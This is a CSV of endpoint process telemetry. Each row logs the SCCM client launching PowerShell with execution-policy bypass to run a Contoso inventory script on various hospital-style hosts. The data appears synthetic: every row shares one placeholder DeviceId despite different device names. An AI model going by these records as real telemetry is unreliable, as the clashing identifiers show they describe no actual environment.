Timestamp,DeviceId,DeviceName,FileName,ProcessId,ProcessCreationTime,ProcessCommandLine,AccountName,InitiatingProcessFileName,InitiatingProcessId
2026-07-16T02:55:26.0000000Z,a1b2c3d4e5f60718293a4b5c6d7e8f9012345678,NSH-ADMIN-WS032,powershell.exe,6188,2026-07-16T02:55:26.0000000Z,"powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""C:\Program Files\Contoso\inventory.ps1""",svc_backup,CcmExec.exe,1232
2026-07-21T22:55:26.0000000Z,a1b2c3d4e5f60718293a4b5c6d7e8f9012345678,NSH-APP-SRV03,powershell.exe,3131,2026-07-21T22:55:26.0000000Z,"powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""C:\Program Files\Contoso\inventory.ps1""",adm.tcheng,CcmExec.exe,1060
2026-07-23T00:55:26.0000000Z,a1b2c3d4e5f60718293a4b5c6d7e8f9012345678,NSH-FILE-SRV02,powershell.exe,5406,2026-07-23T00:55:26.0000000Z,"powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""C:\Program Files\Contoso\inventory.ps1""",adm.tcheng,CcmExec.exe,994
2026-07-29T02:55:26.0000000Z,a1b2c3d4e5f60718293a4b5c6d7e8f9012345678,NSH-ADMIN-WS031,powershell.exe,2904,2026-07-29T02:55:26.0000000Z,"powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""C:\Program Files\Contoso\inventory.ps1""",svc_backup,CcmExec.exe,1205
2026-07-29T22:55:26.0000000Z,a1b2c3d4e5f60718293a4b5c6d7e8f9012345678,NSH-RSCH-SRV07,powershell.exe,4540,2026-07-29T22:55:26.0000000Z,"powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""C:\Program Files\Contoso\inventory.ps1""",svc_backup,CcmExec.exe,966
2026-07-31T01:55:26.0000000Z,a1b2c3d4e5f60718293a4b5c6d7e8f9012345678,NSH-RSCH-SRV07,powershell.exe,4757,2026-07-31T01:55:26.0000000Z,"powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""C:\Program Files\Contoso\inventory.ps1""",adm.tcheng,CcmExec.exe,1183
2026-07-31T23:55:26.0000000Z,a1b2c3d4e5f60718293a4b5c6d7e8f9012345678,NSH-APP-SRV03,powershell.exe,4442,2026-07-31T23:55:26.0000000Z,"powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""C:\Program Files\Contoso\inventory.ps1""",adm.tcheng,CcmExec.exe,1143
2026-08-04T23:55:26.0000000Z,a1b2c3d4e5f60718293a4b5c6d7e8f9012345678,NSH-CLIN-WS011,powershell.exe,4002,2026-08-04T23:55:26.0000000Z,"powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""C:\Program Files\Contoso\inventory.ps1""",adm.tcheng,CcmExec.exe,1138
2026-08-06T02:55:26.0000000Z,a1b2c3d4e5f60718293a4b5c6d7e8f9012345678,NSH-LAB-WS051,powershell.exe,3268,2026-08-06T02:55:26.0000000Z,"powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""C:\Program Files\Contoso\inventory.ps1""",svc_backup,CcmExec.exe,917
2026-08-07T00:55:26.0000000Z,a1b2c3d4e5f60718293a4b5c6d7e8f9012345678,NSH-APP-SRV03,powershell.exe,3778,2026-08-07T00:55:26.0000000Z,"powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""C:\Program Files\Contoso\inventory.ps1""",adm.tcheng,CcmExec.exe,1429
